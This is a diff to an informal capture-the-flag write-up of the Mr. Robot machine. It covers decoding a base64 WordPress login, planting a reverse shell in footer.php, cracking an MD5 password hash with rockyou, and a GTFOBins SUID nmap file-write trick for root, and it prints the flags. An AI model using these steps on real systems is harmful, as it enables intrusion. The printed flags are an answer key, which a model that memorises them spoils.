@@ -4,6 +4,7 @@ tags:
   - fetus
 ---
 ## initial stuff:
+- note from the future: its identical to the tryhackme room. room link: https://tryhackme.com/room/mrrobot 
 - got the machine running. i loved watching Mr. Robot. this better be good <br>
 ![[MrRobot-1IsRunningSS.png]]
 - did `arp-scan -l`. IP is `192.168.48.135`. lets run nmap 
@@ -227,3 +228,97 @@ video                   [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 
 Year201120102009200820072006200520042003200220012000199919981997199619951994199319921991199019891988198719861985198419831982198119801979197819771976197519741973197219711970196919681967196619651964196319621961196019591958195719561955195419531952195119501949194819471946194519441943194219411940193919381937193619351934193319321931193019291928192719261925192419231922192119201919191819171916191519141913191219111910190919081907190619051904190319021901 [Status: 403, Size: 657, Words: 16, Lines: 10, Duration: 3ms]
 :: Progress: [11451/11451] :: Job [1/1] :: 202 req/sec :: Duration: [0:00:54] :: Errors: 0 ::
 ```
+- `/license/` tried to troll. there was a base64 encoded password or something down below after a bit of scrolling
+```sh
+ZWxsaW90OkVSMjgtMDY1Mgo=
+```
+- lets decode ts:
+```sh
+╰─[:)] # echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
+elliot:ER28-0652
+```
+- new creds yaay:
+```sh
+elliot:ER28-0652
+```
+- lets ssh in 
+- huh doesnt let me wtf
+- lets try the wp-login instead ig
+- yup it was the creds for the wp-login
+- went to the editor and put in a quick little reverse shell in the `footer.php` since its in every page and easy to activate. got a shell. stabilized it with [[python-tty-shell]]
+- some info:
+```sh
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+Linux ip-10-10-36-85 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+```
+- key 2 is in `/home/robot/` but i dont have the perms to read it. found key 1 at `/opt/bitnami/apps/wordpress/htdocs/key-1-of-3.txt` 
+- uploaded `linpeas.sh` and `linux-exploit-suggester.sh` at `/tmp`. ran linpeas first. lets see whats in there 
+- holy shit a Yellow/Red :0 <br>
+![[MrRobotCTFomgYellowRedSS.png]]
+- `CVE-2021-3560` huh. lets see what that is
+- :0 polkit. wanted to exploit this on a different machine but didnt work there. hell_yeah_simulator.png xD
+- found this article on it. pretty useful: https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/#exploitation
+- doesnt seem to work. lemme enumerate further first
+- lets visit the user home directories and see whats in them. gonna visit robot first 
+```sh
+daemon@ip-10-10-36-85:/home/robot$ ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 4 root  root  4096 Jun  2 18:14 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+```
+- noway a raw md5 pass just sitting there? 
+```sh
+daemon@ip-10-10-36-85:/home/robot$ cat password.raw-md5 
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+- daamn. lets try to crack the MD5 with the given wordlist and [[autoCrack.py]] :D
+- didnt work with the given wordlist. lets try rockyou
+```sh
+→ Mode 0      (MD5) … [FOUND]
+    c3fcd3d76192e4007dfb496cca67e13b → 'abcdefghijklmnopqrstuvwxyz'
+```
+- hell yeah [[autoCrack.py]] rocks xD i love that i made it on a whim a few days ago
+- new creds:
+```sh
+robot:abcdefghijklmnopqrstuvwxyz
+```
+- got in
+```sh
+$ id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+/usr/bin/python
+$ echo $SHELL
+/bin/sh
+```
+- smh gotta stabilize it again - __ - 
+- okay lets get that 2nd flag now 
+```sh
+robot@ip-10-10-36-85:~$ cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+- okay the next flag is probably at root 
+- no point in running `sudo -l`. lets check if `/etc/passwd` is writable
+- nope its not. more enumeration it is :D
+- wait uid 1002?? there are 2 other users?
+	- oh its just mysql and ubuntu
+- linux-exploit-suggester.sh couldnt give me anything
+- lets run linpeas again. maybe i missed something
+- `/usr/local/bin/nmap` has SUID set for root and is Red/Yellow :0
+- gtfobins here i cumm :DDDD <br>
+![[MrRobotCTFgtfoBinsSS.png]]
+- alr lets do this 
+```sh
+LFILE=file_to_write
+/usr/local/bin/nmap -oG=$LFILE DATA
+```
+- HOLY SHIT ROOTEDDDDDDDDDDDD <br>
+![[MrRobotCTFHASBEENROOTED.png]]
+- lets get that final flag XD
+```sh
+root@ip-10-10-36-85:~# cat key-3-of-3.txt 
+04787ddef27c3dee1ee161b21670b4e4
+```
+- welp was fun. was easy as hell but whatever i got the badge hell yeah xD <br>
+![[MrRobotCTFBadgeSS.png]]
